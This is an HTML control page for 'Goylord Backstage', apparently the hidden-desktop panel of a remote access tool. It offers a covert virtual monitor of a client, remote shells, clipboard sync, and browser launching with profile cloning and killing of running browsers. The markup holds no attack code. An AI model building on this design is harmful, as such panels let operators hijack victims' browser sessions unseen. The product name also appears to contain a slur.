<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="/assets/nav-prelude.js"></script>
    <link rel="modulepreload" href="/assets/nav.js" />
    <title>Goylord Backstage</title>
    <link rel="icon" type="image/x-icon" href="/assets/favicon.ico" />
    <link rel="stylesheet" href="/vendor/inter/400.css" />
    <link rel="stylesheet" href="/vendor/inter/600.css" />
    <link rel="stylesheet" href="/vendor/inter/700.css" />
<link rel="stylesheet" href="/assets/tailwind.css" />
    <link rel="stylesheet" href="/vendor/fontawesome/css/all.min.css" />
    <link rel="stylesheet" href="/assets/main.css" />
    <link rel="stylesheet" href="/assets/custom.css" />
    <link rel="stylesheet" href="/assets/console.css" />
    <script defer src="/assets/logout.js"></script>
  </head>
  <body class="min-h-screen bg-slate-950 text-slate-100">
    <header id="top-nav"></header>

    <main class="px-5 py-6 flex-1 flex flex-col">
      <div class="flex-1 flex flex-col gap-4" style="max-width: 100%">
        <div class="flex flex-wrap gap-2 items-center">
          <div class="flex items-center gap-2">
            <button id="startBtn" class="button primary">
              <i class="fa-solid fa-play"></i><span>Start</span>
            </button>
            <button id="stopBtn" class="button ghost">
              <i class="fa-solid fa-stop"></i><span>Stop</span>
            </button>
            <button id="commandsBtn" class="button ghost">
              <i class="fa-solid fa-terminal"></i><span>Commands</span>
            </button>
            <button id="fullscreenBtn" class="button ghost">
              <i class="fa-solid fa-expand"></i><span>Fullscreen</span>
            </button>
          </div>

          <div
            id="streamStatus"
            class="inline-flex items-center gap-2 px-3 py-2 rounded-full bg-slate-800 text-slate-300 border border-slate-700 text-sm"
          >
            <i class="fa-solid fa-circle-notch fa-spin"></i>
            <span>Connecting</span>
          </div>

          <div
            id="cloneProgress"
            class="hidden items-center gap-2 bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 text-sm text-slate-300"
          >
            <i class="fa-solid fa-clone text-violet-400"></i>
            <span id="cloneProgressLabel">Cloning profile…</span>
            <div class="w-32 h-2 bg-slate-700 rounded-full overflow-hidden">
              <div id="cloneProgressBar" class="h-full bg-violet-500 rounded-full transition-all duration-200" style="width: 0%"></div>
            </div>
            <span id="cloneProgressPct" class="pill pill-ghost font-mono text-violet-200 min-w-[3ch] text-right">0%</span>
          </div>
          <div
            id="dxgiStatus"
            class="hidden items-center gap-2 bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 text-sm"
          >
            <i id="dxgiStatusIcon" class="fa-solid fa-microchip text-emerald-400"></i>
            <span id="dxgiStatusLabel">DXGI</span>
          </div>
          <div
            id="launchStatus"
            class="hidden items-center gap-2 bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 text-sm"
          >
            <i id="launchStatusIcon" class="fa-solid fa-rocket text-sky-400"></i>
            <span id="launchStatusLabel" class="text-slate-300">Launching...</span>
          </div>

          <div
            class="flex items-center gap-2 bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 text-sm text-slate-300"
          >
            <span class="uppercase tracking-wide text-xs text-slate-500">fps</span>
            <span id="agentFps" class="pill pill-ghost font-mono text-violet-200">--</span>
            <span class="text-slate-600">→</span>
            <span id="viewerFps" class="pill pill-ghost font-mono text-sky-200">--</span>
            <span class="text-slate-600">|</span>
            <span class="uppercase tracking-wide text-xs text-slate-500">lat</span>
            <span id="latencyDisplay" class="pill pill-ghost font-mono text-amber-200">--</span>
          </div>

          <div class="relative ml-auto" id="rdSettingsWrap">
            <button
              id="rdSettingsBtn"
              type="button"
              class="button ghost"
              aria-haspopup="true"
              aria-expanded="false"
            >
              <i class="fa-solid fa-sliders"></i><span>Settings</span>
              <i class="fa-solid fa-chevron-down text-[10px] text-slate-400 ml-1"></i>
            </button>

            <div
              id="rdSettingsMenu"
              class="hidden absolute right-0 top-full mt-2 w-[360px] max-h-[75vh] overflow-y-auto rounded-xl border border-slate-700 bg-slate-900/95 backdrop-blur-md shadow-2xl shadow-black/50 z-50"
              role="menu"
            >
              <div class="px-4 py-3 border-b border-slate-800">
                <div class="text-xs uppercase tracking-wide text-slate-500 mb-2">Display</div>
                <div class="flex items-center gap-2 mb-2">
                  <label class="text-sm text-slate-300 w-20" for="displaySelect">Monitor</label>
                  <select
                    id="displaySelect"
                    class="flex-1 bg-slate-800 border border-slate-700 rounded px-2 py-1 text-sm text-slate-100"
                  ></select>
                  <button id="refreshDisplays" class="button ghost" title="Refresh display list">
                    <i class="fa-solid fa-rotate"></i>
                  </button>
                </div>
                <div class="flex items-center gap-2">
                  <label class="text-sm text-slate-300 w-20" for="backstageResolutionSelect">Resolution</label>
                  <select
                    id="backstageResolutionSelect"
                    class="flex-1 bg-slate-800 border border-slate-700 rounded px-2 py-1 text-sm text-slate-100"
                  >
                    <option value="720">720p</option>
                    <option value="1080" selected>1080p</option>
                    <option value="1440">1440p</option>
                    <option value="-1">Native</option>
                  </select>
                </div>
              </div>

              <div class="px-4 py-3 border-b border-slate-800">
                <div class="text-xs uppercase tracking-wide text-slate-500 mb-2">Video</div>
                <div class="flex items-center gap-2 mb-2">
                  <label class="text-sm text-slate-300 w-20" for="qualitySlider">Quality</label>
                  <input
                    id="qualitySlider"
                    type="range"
                    min="10"
                    max="100"
                    step="5"
                    value="90"
                    class="flex-1 accent-violet-400"
                  />
                  <span id="qualityValue" class="pill pill-ghost text-slate-100 text-xs min-w-[44px] text-center">90%</span>
                </div>
                <div class="flex items-center gap-2 mb-2">
                  <label class="text-sm text-slate-300 w-20" for="webrtcMode">Transport</label>
                  <select id="webrtcMode" class="flex-1 bg-slate-800 border border-slate-700 rounded px-2 py-1 text-sm text-slate-100" title="Streaming transport. P2P: browser to agent direct, server only relays signaling. Relayed: through MediaMTX.">
                    <option value="off" selected>Canvas</option>
                    <option value="p2p">WebRTC P2P</option>
                    <option value="relayed">WebRTC Relayed</option>
                  </select>
                </div>
                <div class="flex items-center gap-2 mb-2">
                  <label class="text-sm text-slate-300 w-20" for="targetFpsSelect">Max FPS</label>
                  <select id="targetFpsSelect" class="flex-1 bg-slate-800 border border-slate-700 rounded px-2 py-1 text-sm text-slate-100" title="Target capture and encoder frame rate">
                    <option value="30">30 fps</option>
                    <option value="60">60 fps</option>
                    <option value="90">90 fps</option>
                    <option value="120" selected>120 fps</option>
                    <option value="144">144 fps</option>
                    <option value="165">165 fps</option>
                    <option value="240">240 fps</option>
                  </select>
                </div>
                <div class="flex items-center justify-between gap-2">
                  <label class="flex items-center gap-2 text-sm text-slate-200" title="Prefer H.264 when available; disable to force JPEG">
                    <input type="checkbox" id="codecH264" checked /> H.264
                  </label>
                  <span id="codecMode" class="pill pill-ghost text-slate-100 text-xs">Codec: auto</span>
                </div>
              </div>

              <div class="px-4 py-3 border-b border-slate-800">
                <div class="text-xs uppercase tracking-wide text-slate-500 mb-2">Input &amp; Capture</div>
                <div class="grid grid-cols-2 gap-x-3 gap-y-2">
                  <label class="flex items-center gap-2 text-sm text-slate-200">
                    <input type="checkbox" id="mouseCtrl" checked /> Mouse
                  </label>
                  <label class="flex items-center gap-2 text-sm text-slate-200">
                    <input type="checkbox" id="kbdCtrl" checked /> Keyboard
                  </label>
                  <label class="flex items-center gap-2 text-sm text-slate-200 col-span-2" title="Sync clipboard between your browser and the remote machine">
                    <input type="checkbox" id="clipboardSyncCtrl" /> Clipboard Sync
                  </label>
                  <label class="flex items-center gap-2 text-sm text-slate-200 col-span-2" title="Use UI Automation for WinUI3 app input (modern Windows apps). Disable if input is unreliable in non-WinUI3 apps.">
                    <input type="checkbox" id="uiaCtrl" /> UIA Support
                  </label>
                </div>
              </div>

            </div>
          </div>
        </div>

        <div
          id="canvasContainer"
          class="flex-1 rounded-xl border border-violet-800/50 bg-slate-900/70 shadow-lg overflow-hidden flex flex-col"
          style="min-height: 500px"
        >
          <div class="p-3 text-sm text-slate-400 flex-shrink-0 flex items-center gap-2 overflow-hidden">
            <i class="fa-solid fa-ghost text-violet-400 flex-shrink-0"></i>
            <span class="whitespace-nowrap overflow-hidden text-ellipsis">Virtual Monitor - Client: <span id="clientLabel" class="text-slate-100">-</span></span>
            <span id="zoomIndicator" class="ml-auto hidden px-2 py-0.5 rounded bg-slate-800 text-slate-300 text-xs font-mono border border-slate-700">100%</span>
          </div>
          <div
            id="canvasScrollArea"
            class="flex-1 flex items-center justify-center p-4"
            style="min-height: 0; min-width: 0; overflow: hidden; position: relative"
          >
            <canvas
              id="frameCanvas"
              class="bg-slate-950"
              width="1280"
              height="720"
              style="
                display: block;
                max-width: 100%;
                max-height: 100%;
                width: auto;
                height: auto;
                transform-origin: center center;
              "
            ></canvas>
            <video
              id="webrtcVideo"
              class="bg-slate-950"
              autoplay
              playsinline
              muted
              style="
                display: none;
                max-width: 100%;
                max-height: 100%;
                width: auto;
                height: auto;
              "
            ></video>
          </div>
        </div>
        <div
          id="backstageContextMenu"
          class="hidden fixed z-50 min-w-[220px] max-h-[80vh] overflow-y-auto rounded-lg border border-slate-700 bg-slate-900/95 text-sm text-slate-200 shadow-xl"
        >
          <!-- Options -->
          <div class="px-3 pt-2 pb-1 text-xs uppercase tracking-wide text-slate-500">Options</div>
          <label class="flex items-center gap-2 px-3 py-1.5 cursor-pointer hover:bg-slate-800/70 select-none">
            <input type="checkbox" id="backstageCloneToggle" checked class="accent-violet-500 w-4 h-4 rounded" />
            <span class="text-xs text-slate-300">Clone profile</span>
          </label>
          <label class="flex items-center gap-2 px-3 py-1.5 cursor-pointer hover:bg-slate-800/70 select-none">
            <input type="checkbox" id="backstageCloneLiteToggle" class="accent-violet-500 w-4 h-4 rounded" />
            <span class="text-xs text-slate-300">Lite clone (no extensions)</span>
          </label>
          <label class="flex items-center gap-2 px-3 py-1.5 cursor-pointer hover:bg-slate-800/70 select-none">
            <input type="checkbox" id="backstageKillIfRunningToggle" class="accent-violet-500 w-4 h-4 rounded" />
            <span class="text-xs text-slate-300">Kill browser if running</span>
          </label>
          <div class="my-1 border-t border-slate-700/60"></div>
          <!-- Shells -->
          <div class="px-3 pt-2 pb-1 text-xs uppercase tracking-wide text-slate-500">Shells</div>
          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-cmd">
            <i class="fa-solid fa-terminal mr-2 text-violet-300"></i>cmd.exe
          </button>
          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-powershell">
            <i class="fa-solid fa-bolt mr-2 text-sky-300"></i>powershell.exe
          </button>
          <div class="my-1 border-t border-slate-700/60"></div>
          <!-- Chromium Browsers -->
          <div class="px-3 pt-2 pb-1 text-xs uppercase tracking-wide text-slate-500">Chromium</div>
          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-chrome" data-browser="chrome">
            <i class="fa-brands fa-chrome mr-2 text-emerald-300"></i>Chrome
          </button>
          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-brave" data-browser="brave">
            <i class="fa-brands fa-brave mr-2 text-amber-300"></i>Brave
          </button>
          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-edge" data-browser="edge">
            <i class="fa-brands fa-edge mr-2 text-sky-300"></i>Edge
          </button>
          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-opera" data-browser="opera">
            <i class="fa-brands fa-opera mr-2 text-red-400"></i>Opera
          </button>
          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-operagx" data-browser="operagx">
            <i class="fa-brands fa-opera mr-2 text-fuchsia-400"></i>Opera GX
          </button>
          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-vivaldi" data-browser="vivaldi">
            <i class="fa-solid fa-globe mr-2 text-rose-300"></i>Vivaldi
          </button>
          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-yandex" data-browser="yandex">
            <i class="fa-brands fa-yandex-international mr-2 text-yellow-300"></i>Yandex
          </button>
          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-arc" data-browser="arc">
            <i class="fa-solid fa-globe mr-2 text-blue-300"></i>Arc
          </button>
          <div class="my-1 border-t border-slate-700/60"></div>
          <!-- Firefox Browsers -->
          <div class="px-3 pt-2 pb-1 text-xs uppercase tracking-wide text-slate-500">Firefox</div>
          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-firefox" data-browser="firefox">
            <i class="fa-brands fa-firefox mr-2 text-orange-300"></i>Firefox
          </button>
          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-waterfox" data-browser="waterfox">
            <i class="fa-brands fa-firefox mr-2 text-cyan-300"></i>Waterfox
          </button>
          <div class="my-1 border-t border-slate-700/60"></div>
          <!-- Custom -->
          <div class="px-3 pt-2 pb-1 text-xs uppercase tracking-wide text-slate-500">Custom</div>
          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="start-custom">
            <i class="fa-solid fa-file mr-2 text-slate-300"></i>Run custom exe…
          </button>
          <button type="button" class="w-full text-left px-3 py-1.5 hover:bg-slate-800/70" data-action="lookup-exe">
            <i class="fa-solid fa-magnifying-glass mr-2 text-amber-300"></i>Lookup exe…
          </button>
          <div class="my-1 border-t border-slate-700/60"></div>
          <!-- Installed Apps -->
          <div class="px-3 pt-2 pb-1 text-xs uppercase tracking-wide text-slate-500 flex items-center gap-2">
            <span>Installed Apps</span>
            <span id="installedAppsCount" class="text-slate-600"></span>
            <button type="button" id="refreshInstalledApps" class="ml-auto text-slate-500 hover:text-slate-300" title="Refresh installed apps">
              <i class="fa-solid fa-rotate text-[10px]"></i>
            </button>
          </div>
          <div id="installedAppsLoading" class="px-3 py-3 text-xs text-slate-500 text-center">
            <i class="fa-solid fa-spinner fa-spin mr-1"></i>Loading apps…
          </div>
          <div id="installedAppsList" class="hidden px-1.5 pb-1.5">
            <div class="px-1 pt-1 pb-1.5 sticky top-0 bg-slate-900/95 backdrop-blur">
              <div class="relative">
                <i class="fa-solid fa-magnifying-glass absolute left-2 top-1/2 -translate-y-1/2 text-[10px] text-slate-500"></i>
                <input id="installedAppsSearch" type="text" placeholder="Search apps…" autocomplete="off" spellcheck="false"
                       class="w-full text-xs bg-slate-950/70 border border-slate-700/60 rounded pl-6 pr-6 py-1 text-slate-200 placeholder-slate-500 focus:outline-none focus:border-violet-500/50" />
                <button type="button" id="installedAppsSearchClear" class="hidden absolute right-1.5 top-1/2 -translate-y-1/2 text-[10px] text-slate-500 hover:text-slate-300" title="Clear">
                  <i class="fa-solid fa-xmark"></i>
                </button>
              </div>
              <div id="installedAppsEmpty" class="hidden text-[10px] text-slate-500 text-center pt-1.5">No matching apps</div>
            </div>
            <div id="installedAppsScroll" class="max-h-[260px] overflow-y-auto">
              <div class="grid grid-cols-1 gap-0.5" id="installedAppsGrid"></div>
            </div>
          </div>
        </div>
        <style>
          body {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
          }
          #canvasContainer[data-stream-state="streaming"] {
            border-color: rgba(139, 92, 246, 0.7);
            box-shadow: 0 0 0 1px rgba(139, 92, 246, 0.45);
          }
          #canvasContainer[data-stream-state="stalled"] {
            border-color: rgba(251, 146, 60, 0.7);
            box-shadow: 0 0 0 1px rgba(251, 146, 60, 0.45);
          }
          #canvasContainer:fullscreen {
            display: flex;
            flex-direction: column;
            background: #000;
          }
          #canvasContainer:fullscreen #frameCanvas {
            width: 100%;
            height: 100%;
            object-fit: contain;
            margin: auto;
          }
          #frameCanvas.zoomed {
            object-fit: contain;
            image-rendering: auto;
          }
          #backstageContextMenu.hidden {
            display: none;
          }
          #backstageContextMenu button.browser-unavailable {
            opacity: 0.35;
            pointer-events: none;
            cursor: default;
          }
          #backstageContextMenu button.browser-unavailable::after {
            content: " (not found)";
            font-size: 0.65rem;
            color: #94a3b8;
          }
          #installedAppsScroll::-webkit-scrollbar {
            width: 6px;
          }
          #installedAppsScroll::-webkit-scrollbar-track {
            background: transparent;
          }
          #installedAppsScroll::-webkit-scrollbar-thumb {
            background: #334155;
            border-radius: 3px;
          }
          #installedAppsScroll::-webkit-scrollbar-thumb:hover {
            background: #475569;
          }
          .installed-app-btn {
            display: flex;
            align-items: center;
            gap: 8px;
            width: 100%;
            text-align: left;
            padding: 5px 8px;
            border-radius: 6px;
            font-size: 0.75rem;
            color: #e2e8f0;
            transition: background 0.15s;
          }
          .installed-app-btn:hover {
            background: rgba(139, 92, 246, 0.18);
            color: #c4b5fd;
          }
          .installed-app-btn img {
            width: 20px;
            height: 20px;
            flex-shrink: 0;
            image-rendering: auto;
          }
          .installed-app-btn .app-icon-placeholder {
            width: 20px;
            height: 20px;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #1e293b;
            border-radius: 4px;
            font-size: 10px;
            color: #64748b;
          }
          .installed-app-btn .app-name {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            min-width: 0;
          }
        </style>
      </div>
    </main>

    <script defer src="/vendor/msgpackr/msgpackr.js"></script>
    <script defer src="/assets/remotedesktop-settings-menu.js"></script>
    <script type="module" src="/assets/nav.js"></script>
    <script type="module" src="/assets/backstage.js"></script>
  </body>
</html>
